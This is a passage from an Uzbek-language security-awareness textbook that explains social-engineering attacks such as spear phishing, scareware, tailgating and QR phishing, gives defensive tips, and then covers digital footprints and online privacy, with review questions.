Spear phishing
Bu fishing firibgarligining yanada nishonlangan, aniq shaxslarga yoki tashkilotlarga qaratilgan shaklidir. Hujumchi ma’lum bir shaxsni yoki korxonani tanlab oladi va hujumni sezilmas qilish uchun ularning xususiyatlari, lavozimlari yoki aloqalariga moslab xabar tayyorlaydi. Spear phishing hujumchidan ancha ko‘p kuch va vaqt talab qiladi (ba’zan hujumni amalga oshirish uchun haftalar yoki oylar ketadi). Uni aniqlash juda qiyin va mohirona bajarilsa, muvaffaqiyat darajasi ham yuqori bo‘ladi.
Spear phishing ssenariysi quyidagicha bo‘lishi mumkin: hujumchi o‘zini tashkilotning IT maslahatchisi sifatida ko‘rsatib, bir yoki bir nechta xodimlarga elektron pochta xabari yuboradi. Xabar matni va imzosi haqiqiy maslahatchining uslubiga aynan mos tushadi, bu esa xodimlarni uning haqiqiy ekanligiga ishontiradi. Xabarda xodimlardan parollarini o‘zgartirish so‘raladi va ularga havola beriladi. Ushbu havola esa ularni zararli sahifaga yo‘naltiradi va hujumchi ularning login ma’lumotlarini qo‘lga kiritadi.
Kvid pro kvo (lotinchadan: Quid pro quo)
Ushbu ibora ingliz tilida “xizmat uchun xizmat” degan ma’noni anglatib, sotsial injineriyaning mazkur turida xaker korporativ tarmoq yoki elektron pochta orqali kompaniyaga murojaatni amalga oshiradi. Ko‘pincha xaker o‘zini texnik xizmat ko‘rsatuvchi sifatida tanitib, texnik xodimning ish joyidagi muammolarni bartaraf etishda “yordam berishini” aytadi. Texnik muammoni “bartaraf” etish vaqtida nishondagi shaxsni buyruqlarni bajarishga yoki jabrlanuvchining kompyuteriga turli xil dasturlarni o‘rnatishga undash amalga oshiriladi. Masalan, 2003-yilda Axborot xavfsizligi dasturi doirasida o‘tkazilgan tadqiqot ofis xodimlarining 90% har qanday xizmat yoki to‘lov uchun maxfiy ma’lumotlarni, masalan, o‘zlarining parollarini, berishga tayyor bo‘lishini ko‘rsatdi.
Scareware
Scareware – bu qurbonlarni yolg‘on ogohlantirishlar va uydirma tahdidlar bilan doimiy ravishda “urib turishga” asoslangan hujum turi. Foydalanuvchilar tizimi zararli dastur bilan yuqtirilgan deb o‘ylashga majbur qilinadi va ular hech qanday foyda bermaydigan (faqat hujumchiga xizmat qiladigan) yoki o‘zi zararli bo‘lgan dasturlarni o‘rnatishga undaladi. Scareware shuningdek aldov dasturi, soxta skaner dasturi yoki firibgarlik dasturi (fraudware) deb ham ataladi.
Scarewarening keng tarqalgan misoli - internetda sayr qilayotganda brauzeringizda “Kompyuteringiz zararli spyware dasturlari bilan yuqtirilgan bo‘lishi mumkin” kabi matn yozilgan, haqiqiy ko‘rinishga ega pop-up bannerlar paydo bo‘lishidir. Bu banner sizga “vositani o‘rnatishni” taklif qiladi (ko‘pincha o‘zi zararli dastur bo‘ladi) yoki sizni kompyuteringizni yuqtiradigan zararli saytga yo‘naltiradi.
Scareware, shuningdek, foydalanuvchilarga yolg‘on ogohlantirishlar yuboradigan yoki foydasiz/zararli xizmatlarni sotib olishni taklif qiladigan spam elektron pochta xabarlari orqali ham tarqatiladi.
Tailgating (piggybacking)
Tailgating hujumi - bu xavfsizlikni buzish turi bo‘lib, unda ruxsatsiz shaxs haqiqiy foydalanish huquqiga ega odamning ortidan ergashib, nazorat qilinadigan hududga kirib oladi. Bunday hujum tashkilotning raqamli zaifliklariga emas, balki jismoniy xavfsizlik choralariga va inson xatti-harakatlariga tayanadi.
Masalan, hujumchi o‘zini yetkazib beruvchi yoki xizmat ko‘rsatuvchi sifatida ko‘rsatib, yuk, quti, ovqat yoki boshqa buyumlarni olib kirish bahonasida xodimdan eshikni ochib berishni so‘rashi mumkin. “Eshikni ushlab turing” texnikasidan tashqari, hujumchilar ba’zan xodimning noutbukini yoki smartfonini foydalanib turish uchun so‘raydi (masalan, “menda batareya tugab qoldi” deb). Bu esa ularga zararli dastur o‘rnatish yoki maxfiy ma’lumotlarni ko‘chirib olish imkonini beradi.
Tailgating hujumlarining maqsadi - keyinchalik yanada murakkab hujumlarni amalga oshirish uchun ishonch qozonish. Bunday hujumlarning muvaffaqiyati kuzatuvchanlik va to‘g‘ri vaqtni tanlashga bog‘liq. Hujumchilar xodimlarning maxfiy hududlarga kirishini kuzatadi va shubha uyg‘otmaslik uchun tabiiy tutadi. Ular o‘zlarini yetkazib beruvchilar, texnik xizmat ko‘rsatuvchilar yoki yangi ishchilar sifatida ko‘rsatishlari mumkin (atrof-muhitga moslashish imkoniyatini oshiradigan har qanday rol).
Bunday hujumlarning oqibatlari juda keng ko‘lamli bo‘lishi mumkin. Ichkariga kirgan hujumchi tarmoqqa ulanadigan portlarga qurilmalar ulashi yoki keyinroq tizimlarni buzish uchun maxsus qurilma qoldirishi mumkin. Shu sababli tashkilotlar nafaqat texnologik himoya vositalariga, balki ijtimoiy muhandislik taktikalariga qarshi xabardorlik madaniyatiga ham sarmoya kiritishi zarur. Tailgating hujumlarini tushunish, jismoniy xavfsizlik protokollari tashkilotning kiberxavfsizlik risklarini boshqarish rejasining ajralmas qismi ekanini yana bir bor tasdiqlaydi.
Tailgating hujumlari va piggybacking ko‘pincha bir-birining o‘rnida qo‘llanadi, chunki ikkalasi ham ruxsatli kirish harakatlaridan foydalanib, ruxsatsiz shaxsning yopiq hududga kirib olishini o‘z ichiga oladi. Biroq tashkilotlar va kiberxavfsizlik mutaxassislaridan ularning kichik farqlarini tushunish talab etiladi.
Tailgating odatda imkoniyatdan foydalanishga asoslangan hujumdir. Bu holatda ruxsatsiz shaxs xavfsizlik nazorati bo‘lgan eshikdan ruxsati bor xodim ortidan yashirincha kiradi (hech kim uni sezmaydi yoki to‘xtatmaydi). Bu passiv yondashuv bo‘lib, hujumchi boshqalarning e’tiborsizligi yoki notanishlarga eshikni ochib berish odatidan foydalanadi.
Piggybacking esa buning teskarisi bo‘lishi mumkin, ya’ni u ataylab yoki tasodifan sodir bo‘ladi. Lekin unda ruxsati bor shaxs tomonidan ma’lum darajada ruxsat berish yoki hech bo‘lmaganda “ruxsat berilgandek ko‘rinish” mavjud bo‘ladi. Piggybacking holatlarida xodim o‘z xushmuomalaligi yoki hujumchining yolg‘on bahonalariga ishonib, kompaniya siyosatiga zid tarzda kimnidir himoyalangan hududga ongli ravishda kiritib yuboradi.
Quishing hujumi
Quishing yoki QR phishing - bu kiberxavfsizlik tahdidi bo‘lib, unda hujumchilar QR kodlardan foydalanib qurbonlarni zararli web-saytlarga yo‘naltiradi yoki ularni zararli kontentni yuklab olishga majburlaydi. Bunday hujumning maqsadi - parollar, moliyaviy ma’lumotlar, yoki shaxsni aniqlovchi ma’lumotlar kabi maxfiy ma’lumotlarni o‘g‘irlash va ulardan shaxsni o‘g‘irlash, moliyaviy firibgarlik yoki ransomware kabi boshqa zararli faoliyatlarda foydalanishdir.
Ushbu turdagi fishing ko‘pincha an’anaviy himoya tizimlaridan, masalan, xavfsiz elektron pochta shlyuzlaridan chetlab o‘tadi. Sababi, elektron pochta ichidagi QR kodlar ko‘plab xavfsizlik tizimlari tomonidan ma’nosiz rasm sifatida qabul qilinadi va bu foydalanuvchilarni maxsus turdagi fishing hujumlariga yanada zaif qiladi. QR kodlar mo‘ljal qilingan qurbonlarga boshqa bir qancha usullar bilan ham taqdim etilishi mumkin.

Ijtimoiy muhandislikdan himoyalanish
Ijtimoiy muhandislar odamlarning qiziqish, qo‘rquv, hayajon kabi hissiyotlaridan foydalanib, ularni tuzoqqa tortadilar va aldov sxemalarini amalga oshiradilar. Shuning uchun elektron pochta orqali yuborilgan qo‘rqinchli xabarlar, web-saytdagi jozibador takliflar yoki tasodifiy topilgan raqamli vositalar sizda shubha uyg‘otsa, ehtiyot bo‘lishingiz kerak. Ogoh bo‘lish ko‘p hollarda raqamli makonda sodir bo‘ladigan ijtimoiy muhandislik hujumlaridan himoyalanishga yordam beradi.
Bundan tashqari, quyidagi tavsiyalar ijtimoiy muhandislik hujumlariga qarshi hushyorlikni oshirishga yordam beradi:
Shubhali manbalardan kelgan email va fayllarni ochmang
Agar sizga kim yuborganini bilmasangiz, bunday xabarga javob berish shart emas. Hatto yuboruvchini tanisangiz ham, agar xabar sizga g‘alati tuyulsa, telefon orqali yoki xizmat ko‘rsatuvchi kompaniyaning rasmiy sayti orqali tasdiqlab ko‘ring. Esda tuting: email manzillarni soxtalashtirish (spoofing) juda oson. Ishonchli manzildan keldi deb o‘ylagan xabar ham aslida hujumchi tomonidan yuborilgan bo‘lishi mumkin.
Ko‘p faktorli autentifikatsiyadan foydalaning
Hujumchilar qo‘lga kiritmoqchi bo‘ladigan eng qimmatli ma’lumotlardan biri - foydalanuvchi akkaunt ma’lumotlari. Ko‘p faktorli autentifikatsiya (MFA) tizimning buzilishi yuz berganda ham akkauntlaringizni himoya qiladi. 
Jozibador takliflardan ehtiyot bo‘ling
Agar biror taklif juda ham yaxshi eshitilsa, uni qabul qilishdan avval yaxshilab o‘ylab ko‘ring. Internetda qisqa izlanish (masalan, Googleda qidirish) uning haqiqiy taklifmi yoki tuzoqmi — buni tezda aniqlashga yordam beradi.
Antivirus/antimalware dasturlarini yangilab boring
Avtomatik yangilanishlar yoqilganiga ishonch hosil qiling yoki har kuni tizimni yangilashni odat qiling. Yangilanishlar o‘rnatilganidan va tizimda zararli dasturlar mavjud emasligidan vaqt-vaqti bilan tekshirib turing.
	Ijtimoiy muhandislik hujumlarining asosiy maqsadi nima va ular inson psixologiyasidan qanday foydalanadi?
	•	Baiting hujumi qanday ishlaydi va jismoniy hamda onlayn ko‘rinishlari o‘rtasidagi farq nimada?
	•	Scareware hujumi foydalanuvchini qanday yo‘l bilan aldab, zararli dastur o‘rnatishga undaydi?
	•	Spear phishing oddiy fishingdan nimasi bilan farq qiladi va nega uni aniqlash qiyin?
	•	Watering hole hujumi qanday jarayon orqali amalga oshiriladi va nega u juda xavfli hisoblanadi?
	•	Tailgating hujumi qanday sodir bo‘ladi va nima uchun u insonning tabiiy xulq-atvoridan foydalanadi?
	•	Tailgating va piggybacking o‘rtasidagi asosiy farq nima?
	•	Quishing (QR phishing) hujumi qanday amalga oshiriladi va QR kodlar nima uchun samarali tuzoq bo‘la oladi?
	•	Foydalanuvchilar barcha yuqoridagi ijtimoiy muhandislik hujumlaridan himoyalanish uchun qaysi asosiy qoidalarga amal qilishlari kerak?
Nazorat savollari
	•	Ijtimoiy muhandislik hujumlarining asosiy maqsadi nima va ular inson psixologiyasidan qanday foydalanadi?
	•	Baiting hujumi qanday ishlaydi va jismoniy hamda onlayn ko‘rinishlari o‘rtasidagi farq nimada?
	•	Scareware hujumi foydalanuvchini qanday yo‘l bilan aldab, zararli dastur o‘rnatishga undaydi?
	•	Spear phishing oddiy fishingdan nimasi bilan farq qiladi va nega uni aniqlash qiyin?
	•	Watering hole hujumi qanday jarayon orqali amalga oshiriladi va nega u juda xavfli hisoblanadi?
	•	Tailgating hujumi qanday sodir bo‘ladi va nima uchun u insonning tabiiy xulq-atvoridan foydalanadi?
	•	Tailgating va piggybacking o‘rtasidagi asosiy farq nima?
	•	Quishing (QR phishing) hujumi qanday amalga oshiriladi va QR kodlar nima uchun samarali tuzoq bo‘la oladi?
	•	Foydalanuvchilar barcha yuqoridagi ijtimoiy muhandislik hujumlaridan himoyalanish uchun qaysi asosiy qoidalarga amal qilishlari kerak?
Nazorat savollari
7.3. Internetda shaxsiylik va raqamli iz  (Ma’ruza mashg‘uloti)
1. Internetda shaxsiy ma’lumotlarni oshkor bo‘lishi holatlari. 
2. Ularni aniqlash usullari va vositalari. 
3. Shaxsiy ma’lumotlarni oshkor etmaslik bo‘yicha tavsiyalar.
Reja:
1. Internetda shaxsiy ma’lumotlarni oshkor bo‘lishi holatlari. 
2. Ularni aniqlash usullari va vositalari. 
3. Shaxsiy ma’lumotlarni oshkor etmaslik bo‘yicha tavsiyalar.
Reja:

Raqamli iz, onlayn shaxsiylik, Google, Google Alerts, Spokeo, PeopleFinder, Have I Been Pwned, Digital Footprint Check, WhatsMyName, Avast Secure Browser, Brave, Tor Browser, DuckDuckGo Browser.
Kalit so‘zlar:
Raqamli iz, onlayn shaxsiylik, Google, Google Alerts, Spokeo, PeopleFinder, Have I Been Pwned, Digital Footprint Check, WhatsMyName, Avast Secure Browser, Brave, Tor Browser, DuckDuckGo Browser.
Kalit so‘zlar:
Internetda shaxsiy ma’lumotlarni oshkor bo‘lishi holatlari
Raqamli iz qoldirish (Digital Footprint) nima?
Raqamli izlar - bu internetdan foydalanganda inson ortida qoladigan ma’lumotlar va o‘zaro aloqalar izlari bo‘lib, ular brauzer tarixi, yuborilgan elektron xatlar yoki kiritilgan ma’lumotlargacha bo‘lgan jarayonlarni o‘z ichiga oladi. Har bir amalga oshirilgan onlayn harakat ushbu raqamli soyaga qo‘shimcha bo‘ladi. Bu ma’lumotlarning katta qismi ommaviy yoki yarim-ommaviy ko‘rinishda bo‘lishi mumkin, ularni butunlay o‘chirish yoki nazorat qilish esa juda qiyin.
Mazkur izlar ikki asosiy turga bo‘linadi: faol va passiv. Faol izlar - bu ijtimoiy tarmoqlarda postlar joylash, sharhlar yozish kabi ataylab qoldiriladigan izlar. Aksincha, passiv raqamli izlar - bu web-saytlardagi kuzatuv vositalari tomonidan foydalanuvchi sezmagan holda yig‘iladigan ma’lumotlar hisoblanadi. Faol va passiv izlar o‘rtasidagi farqlarni tushunish onlayn mavjudlikni to‘g‘ri boshqarish va shaxsiy ma’lumotlarni himoya qilishda muhim ahamiyatga ega.
Faol raqamli izlar
Ijtimoiy tarmoqlarda post joylash, yangiliklarga obuna bo‘lish, onlayn sharh yozish kabi ataylab amalga oshiriladigan faoliyatlar bizning faol raqamli izimizga qo‘shiladi. Telefon raqamini formaga kiritish yoki ijtimoiy tarmoqqa rasm yuklash kabi har bir ma’lumot ulashish harakati kuzatilishi mumkin bo‘lgan raqamli yozuvga aylanishi mumkin.
Yaxshisi, biz o‘z faol raqamli izlarimizni ongli ravishda boshqarish imkoniyatiga egamiz. Qaysi ma’lumotni ulashayotganimizni ehtiyotkorlik bilan tanlab, onlayn shaxsiy obro‘mizni ijobiy shakllantirishimiz mumkin. Bu esa nafaqat o‘zimizni yaxshi ko‘rsatishga xizmat qiladi, balki shaxsiy hayotimizni himoya qilishga ham yordam beradi.
Passiv raqamli izlar
Aksincha, passiv raqamli izlar bizning bevosita xabardorligimizsiz yig‘iladi. Masalan, web-saytlar qo‘llaydigan cookie (kuki) fayllari orqali foydalanuvchining onlayn xatti-harakatlari haqidagi ma’lumotlar bildirilmasdan to‘planadi. Oddiy misol: web-saytga kirganingizda u sizning IP manzilingizni, brauzeringiz haqidagi ma’lumotni qayd etadi (bu sizning passiv raqamli izingizning bir qismidir).
Bunday yo‘l bilan yig‘ilgan ma’lumotlar shaxsga yo‘naltirilgan reklama va maxfiylikning buzilishi xavfini tug‘dirishi mumkin. Ularning yashirin tabiati sababli passiv izlarni boshqarish faol izlarga qaraganda murakkabroq, shu bois kuzatuv mexanizmlarini tushunish onlayn maxfiylikni ta’minlashda muhimdir.
Raqamli izlar nega muhim?
Raqamli izlarning ahamiyati shundaki, ular bizning shaxsiy va professional obro‘mizni shakllantiradi. Insonning onlayn reputatsiyasi offline hayotdagi munosabatlarga, ijtimoiy muhitda ham, ish jarayonlarida ham ta’sir ko‘rsatadi. Ish beruvchilar yoki o‘quv yurtlari nomzodlarni baholayotganda ko‘pincha ularning onlayn faoliyatini tekshiradi. Ijtimoiy tarmoqlardagi har bir izoh, har bir tranzaksiya, har bir post, bularning barchasi insonning murakkab raqamli izlar tizimini hosil qiladi.
Bundan tashqari, internetda tarqalgan shaxsiy ma’lumotlar kiberhujumlar, tahdidlar yoki kiberbulling uchun vositaga aylanishi mumkin. Kompaniyalar esa foydalanuvchilarning raqamli izlaridan foydalanib, qiziqishlariga moslashtirilgan reklama strategiyalarini yaratadi. Raqamli izlarni ongli boshqarishni o‘rganish orqali biz o‘zimizni ortiqcha xavflardan himoya qilishga va noxush oqibatlarning oldini olishga erishamiz.
Online shaxsiylik
Shaxsiylikning standart ta’rifi ikki muhim elementni o‘z ichiga oladi: “yolg‘iz bo‘lish holati va boshqa odamlar tomonidan kuzatilmaslik yoki bezovta qilinmaslik”.
Agar siz yolg‘iz holda o‘zingiz yoqtirgan ijtimoiy tarmoq ilovasini varaqlayotgan bo‘lsangiz, jismonan yolg‘izsiz. Ammo shu bilan birga siz “boshqa odamlar tomonidan kuzatilasiz yoki bezovta qilinasiz.” Ular xonada bo‘lmasligi mumkin, ammo baribir kimningdir ekranida siz bir raqam sifatida namoyon bo‘lasiz. Bundan tashqari, siz doimiy ravishda videolaringizga, maqolalaringizga yoki brauzer faoliyatingizga aralashadigan reklamalar tomonidan bezovta qilinasiz.
Bu vaziyat sizga shaxsiydek tuyulishi mumkin, lekin aslida unday emas. Shu sababli, onlayn shaxsiylik ta’rifi internetga ulangan paytda shaxsiy ma’lumotlaringiz himoyalanishi va xatti-harakatingiz kuzatilmasligiga bo‘lgan tabiiy (va asosli) kutishingizni o‘z ichiga oladi, hech bo‘lmaganda sizning aniq roziligingiz bo‘lmagunicha.
Raqamli izga misollar
Web-saytlarni ko‘zdan kechirayotgan bo‘lsangiz yoki ijtimoiy tarmoqlarda yangilanishlar ulashayotgan bo‘lsangiz, deyarli har bir onlayn o‘zaro aloqa iz qoldiradi. Bu virtual ma’lumotlar izi siz faol ravishda ulashgan ma’lumotlarni ham, o‘zingiz bilmagan holda yig‘iladigan ma’lumotlarni ham o‘z ichiga oladi (7.3-rasm).
Quyida raqamli iz qanday yaratilishiga oid keng tarqalgan misollar keltirilgan:
Onlayn xarid qilish: Internet orqali biror mahsulot sotib olganingizda, ismingiz, manzilingiz, aloqa ma’lumotlaringiz va to‘lov tafsilotlari kabi ma’lumotlarni taqdim etasiz. Bu ma’lumotlar sizning raqamli izingizni kengaytiradi. Ko‘pincha chakana sotuvchilar bunday ma’lumotlarni kelajakdagi foydalanish yoki nishonlangan reklama uchun saqlab qoladilar.
Onlayn bank xizmatlari: Onlayn bankdan foydalanish, kredit hisoblari ochish yoki kriptovalyuta bilan savdo qilish ham sizning raqamli izingizga ma’lumot qo‘shadi.
Ijtimoiy tarmoqlar: Facebook va Instagram kabi platformalar sizning postingiz, izohlaringiz va o‘zaro aloqalaringizni kuzatadi. Platformada qancha vaqt o‘tkazganingiz yoki joylashuv ma’lumotlaringiz kabi omillar ham raqamli izingizga qo‘shiladi.
Raqamli vositalar: elektron pochta va xabar almashish ilovalari singari kundalik muloqot vositalari yuborgan va qabul qilgan xabarlari orqali, shuningdek ular yaratadigan metadata orqali sizning raqamli izingizni shakllantiradi.
Raqamli infratuzilma: Brauzer “fingerprint”i, IP manzilingiz va foydalanayotgan qurilmangiz turi - bularning barchasi kuzatilishi mumkin bo‘lgan raqamli iz qoldiradi.
Raqamli izga ta’sir qiluvchi turli ma’lumotlar haqida grafik tasavvurni quyidagi rasmda ko‘rish mumkin.
Raqamli izingizni shakllantirish uchun turli xil ma’lumotlar birlashtiriladi va qayta ishlanadi.
Raqamli izga kundalik faoliyatlarning ko‘pligi ta’sir qilishini hisobga olgan holda, Google kabi kompaniyalar sizning ma’lumotlaringizdan qanday foydalanishini tushunish juda muhim. Facebook yoki boshqa manbalardan o‘zingiz haqidagi saqlangan ma’lumotlarni yuklab olib, ular qanday ma’lumotlar to‘plaganini ko‘rishingiz mumkin.

7.3-rasm. Raqamli izni majoziy ifodasi
Raqamli izingiz nima uchun muhim?
Raqamli izingiz sizning onlayn maxfiyligingizga, xavfsizligingizga va obro‘yingizga ta’sir ko‘rsatishi mumkin. Reklamachilar, potensial ish beruvchilar va kiberjinoyatchilar siz internetda qoldirgan ma’lumotlarni yig‘ib, ularni siz haqingizda xulosa chiqarish yoki zarar yetkazish uchun ishlatishi mumkin. Bu esa hatto offline hayotingizga ham ta’sir qilishi ehtimoldan xoli emas.
Quyida raqamli izingizning real hayotdagi oqibatlari keltirilgan:
Tasodifiy ulashish: ommaviy ko‘rinadigan raqamli izlaringizdagi ma’lumotlar internetga kira oladigan istalgan shaxs, ya’ni oila a’zolari, reklama beruvchilar, ish beruvchilar yoki xakerlar tomonidan ko‘rilishi mumkin. Bu esa kutilmagan oqibatlarga olib kelishi ehtimoli bor.
Obro‘ga ta’siri: raqamli izingiz sizning obro‘yingizga putur yetkazishi mumkin, yillar oldin joylangan bitta post yoki izoh qayta paydo bo‘lib, hozirgi yoki kelajakdagi ish imkoniyatlaringizga salbiy ta’sir qilishi mumkin.
Xakerlar uchun zaiflik: xakerlar sizning raqamli izingizdan foydalanib fishing, spear-phishing yoki doxxing kabi hujumlarni amalga oshirishlari mumkin. Agar ma’lumotlaringiz sizib chiqishi (data leak) natijasida oshkor bo‘lsa, ular dark webga ham tushib qolishi mumkin.
Maqsadli reklama: kompaniyalar siz haqingizdagi ma’lumotlardan foydalanib, sizga aniq sizga moslangan reklamalarni ko‘rsatishi mumkin. Bu esa shaxsiy hayotga aralashuvdek tuyulishi mumkin.
Ularni aniqlash usullari va vositalari
Siz raqamli izingizni qo‘lda izlash usullari va maxsus onlayn vositalar kombinatsiyasi yordamida tekshirishingiz mumkin.
Qo‘lda tekshirish usullari
Google orqali o‘zingiz haqingizda qidiring: to‘liq ismingizni qidiruv tizimiga kiriting, aniqroq natija uchun qo‘shtirnoqdan foydalaning (masalan, “Abdullayev Islombek”). Agar ismingiz keng tarqalgan bo‘lsa, natijalarni toraytirish uchun shahar yoki kasbingizni qo‘shing (masalan, “Abdullayev Islombek dasturchi”).
Google Alerts sozlang: ismingiz yoki shaxsiy ma’lumotlaringiz internetda qayd etilishini kuzatish uchun Google Alert yarating. Qidiruv so‘zlaringizga mos yangi kontent paydo bo‘lganda elektron pochta orqali xabarnoma olasiz.
Ijtimoiy tarmoqlardagi profillaringizni ko‘rib chiqing: barcha ijtimoiy tarmoqlardagi akkauntlaringizga kiring va maxfiylik sozlamalarini tekshiring. Eski postlar, rasmlar, kontaktlar ro‘yxatini ko‘rib chiqing va maxfiy ma’lumotlar ommaga ko‘rinmasligiga ishonch hosil qiling. Faol bo‘lmagan eski akkauntlarni o‘chirib tashlashni ham ko‘rib chiqing.
Shaxsiy ma’lumotlar qidiriladigan saytlarni tekshiring: Spokeo yoki PeopleFinder kabi ma’lumot brokerlari saytlarida o‘zingiz haqingizdagi ma’lumotlarni qo‘lda qidiring. Bu saytlarda ma’lumotni o‘chirib tashlash (opt-out) imkoniyati mavjud, ammo bu jarayon ko‘p vaqt talab qilishi mumkin.
Onlayn vositalar
Ma’lumotlar sizib chiqishini tekshiruvchi vositalar:  elektron pochta manzilingiz yoki telefon raqamingiz ma’lumotlar sizib chiqishida qatnashgan-qatnashmaganini tekshirish uchun bepul vositalardan foydalaning. Mashhur variantlarga “Have I Been Pwned” sayti, shuningdek Bitdefender yoki Malwarebytes kabi kiberxavfsizlik kompaniyalarining xizmatlaridan foydalanish mumkin.
Raqamli izni skanerlovchi xizmatlar: Aura va Incogni kabi xizmatlar elektron pochta manzilingiz orqali xalq qidiruv saytlarini, dark web manbalarini va ochiq ma’lumotlar bazalarini skanerlab, siz haqingizdagi ma’lumotlar qayerda mavjudligini aniqlab beradi.
Username (foydalanuvchi nomi) qidiruv vositalari: Digital Footprint Check kabi vositalar WhatsMyName bazasidan foydalanib, biror foydalanuvchi nomining qaysi platformalarda mavjudligini 500 dan ortiq saytda tekshiradi. Bu siz unutib yuborgan eski akkauntlarni topishda juda foydali.
Shaxsiy ma’lumotlarni oshkor etmaslik bo‘yicha tavsiyalar
Raqamli izni o‘chirib tashlash mumkinmi?
Umuman olganda, raqamli izni to‘liq o‘chirib tashlashning imkoni yo‘q. Hatto siz postlar yoki ma’lumotlarni o‘chirgan taqdirda ham, ular zaxira nusxalarida yoki uchinchi tomon tizimlarida saqlanib qolgan bo‘lishi mumkin. Biroq, yaxshi raqamli gigiyena qoidalariga amal qilish orqali raqamli izingizni boshqarish, ya’ni internetda ulashadigan shaxsiy ma’lumotlaringizni cheklash mumkin.
Faqat xavfsiz web-saytlarga kirish
Faqat ishonchli va xavfsiz saytlarni ochish lozim. URL manzilidagi “https” belgisi sayt foydalanuvchi ma’lumotlarini himoyalovchi SSL shifrlashdan foydalanishini bildiradi. Bu sizning brauzeringiz va sayt o‘rtasidagi ma’lumot almashinuvi xavfsiz ekanini anglatadi.
“http” bilan boshlanuvchi saytlar xavfsiz emas, ularda ulanish himoyalanmagan va bunday saytlar zarar yetkazuvchi sahifa bo‘lishi ehtimoli yuqori.
Qo‘shimcha himoya sifatida soxta saytlarni aniqlay oladigan maxfiylikka yo‘naltirilgan brauzerdan foydalanish tavsiya etiladi. Masalan, Avast Secure Browser, Brave, Tor Browser, DuckDuckGo Browser va hk.
Ijtimoiy tarmoqdagi maxfiylik sozlamalarini ko‘rib chiqish
Facebook, Instagram yoki boshqa ijtimoiy platformalardagi maxfiylik sozlamalarini muntazam tekshirib, kerak bo‘lsa yangilash lozim. Ko‘plab tarmoqlar vaqti-vaqti bilan maxfiylik qoidalarini o‘zgartirib turadi, shuning uchun sozlamalarni doimo nazorat qilish muhim.
Imkon qadar shaxsiy ma’lumotlarni o‘chirish
Ba’zan siz kiritmagan ma’lumotlar ham internetda paydo bo‘lishi mumkin, masalan, people-search saytlarida yoki White Pagesda. Ma’lumot brokerlari (data brokers) bunday manbalardan hamda ijtimoiy tarmoqlaringizdan ma’lumot to‘plab, ular asosida to‘plangan ma’lumotlarni reklama beruvchilar, siyosiy guruhlar yoki istalgan xaridorga sotadi.
Ushbu ma’lumotlarni o‘chirish uchun har bir saytga alohida murojaat qilish kerak bo‘ladi. Odatda ular rad etish yoki ma’lumot o‘chirish shakllarini taklif qiladi.
Haddan tashqari ma’lumot ulashmaslik
Ijtimoiy tarmoqlarda yoki forumlarda ma’lumot ulashayotganda ehtiyotkor bo‘ling. Telefon raqami, elektron pochta kabi sezgir ma’lumotlarni ochiq joylashtirmaslik lozim, xakerlar bu ma’lumotlardan foydalanishi mumkin. Shuni esdan chiqarmaslik lozimki joylashtirgan har bir narsa raqamli izning bir qismiga aylanadi. Qanchalik ko‘p ma’lumot bo‘lsa, raqamli iz shunchalik kengayadi.
Ijtimoiy tarmoq orqali kirishni (social sign-on) ishlatmaslik
“Google bilan kirish”, “Facebook bilan kirish” kabi funksiyalar qulay tuyulishi mumkin, ammo ular uchinchi tomon saytlariga sizning ijtimoiy tarmoqdagi ma’lumotlaringizdan foydalanish huquqini beradi. Bu sizning raqamli izingizni yanada kengaytiradi va ko‘proq shaxsiy ma’lumotlaringiz oshkor bo‘lishi mumkin.
Eski akkauntlarni o‘chirib tashlash
Foydalanilmayotgan eski akkauntlar ma’lumot sizib chiqish xavfini oshiradi. Ijtimoiy tarmoqlar, elektron pochta yoki boshqa platformalardagi faol bo‘lmagan akkauntlar odatda kuzatilmagani bois raqamli izni keraksiz kattalashtiradi va xakerlar uchun oson nishonga aylanishi mumkin.
Kuchli parollardan foydalanish
Har bir akkaunt uchun noyob va kuchli paroldan foydalanish lozim. Bu ma’lumotlar sizib chiqishi yoki parol o‘g‘irlanishi yuz berganda zararni kamaytiradi. Yangi parollar yaratish uchun parol generatoridan foydalanish va ularni boshqarish uchun parollarni boshqarish vositalaridan (password manager) foydalanish lozim.
VPNdan foydalanish
VPN kanalda ulanish shifrlanib, bu esa uchinchi shaxslarning ma’lumotlarni qo‘lga kiritishini deyarli imkonsiz qiladi. VPN shuningdek, IP manzilni yashiradi, onlayn faoliyatni anonim qiladi. 
Tizim va qurilmalarni yangilash
Qurilmadagi operatsion tizim va dasturlarni muntazam yangilab borish lozim. Brauzer yoki tizimning eskirgan versiyalari xakerlar uchun zaifliklar yaratadi. Avtomatik yangilanish funksiyasini yoqish va qo‘shimcha yangilanishlarni vaqti-vaqti bilan tekshirib turish xavfsizlikni oshiradi.
Kukilar va kesh xotiralarni tozalash
Kukilar va kesh xotiralarni muntazam o‘chirish orqali uchinchi tomonlar siz haqingizda to‘plashi mumkin bo‘lgan ma’lumotlar miqdorini kamaytirish mumkin. Bundan tashqari, qurilmadagi bo‘sh joy ham ko‘payadi.
Raqamli izni kamaytiruvchi anti-tracking dasturlardan foydalanish
Maxsus ishlab chiqilgan anti-tracking dasturlari reklamachilar va boshqa tomonlarning siz haqingizdagi ma’lumotlarni to‘plashini cheklaydi. Masalan, Avast AntiTrack onlayn kuzatuvchilarni bloklab, shaxsiy ma’lumotlaringizni yaxshiroq himoya qiladi.
	Raqamli iz (digital footprint) nima va u qanday turdagi ma’lumotlardan shakllanadi?
	•	Faol va passiv raqamli iz o‘rtasidagi asosiy farqlar nimada? Misollar keltiring.
	•	Raqamli izning shaxsiy obro‘, maxfiylik va xavfsizlikka ta’siri qanday bo‘lishi mumkin?
	•	Raqamli izni tekshirish uchun qo‘lda bajariladigan eng samarali usullar qaysilar?
	•	Ma’lumotlar sizib chiqishi raqamli iz uchun qanday xavf tug‘diradi va uni qanday aniqlash mumkin?
	•	Onlayn shaxsiylik (online identity) qanday shakllanadi va unda eski profil yoki kontentlarning roli nimada?
	•	Raqamli izni kamaytirish uchun foydalanuvchi bajarishi kerak bo‘lgan asosiy choralar nimalardan iborat?
	•	VPN, kuchli parollar va ijtimoiy tarmoqlardagi maxfiylik sozlamalari raqamli izni himoyalashda qanday ahamiyatga ega?
Nazorat savollari
	•	Raqamli iz (digital footprint) nima va u qanday turdagi ma’lumotlardan shakllanadi?
	•	Faol va passiv raqamli iz o‘rtasidagi asosiy farqlar nimada? Misollar keltiring.
	•	Raqamli izning shaxsiy obro‘, maxfiylik va xavfsizlikka ta’siri qanday bo‘lishi mumkin?
	•	Raqamli izni tekshirish uchun qo‘lda bajariladigan eng samarali usullar qaysilar?
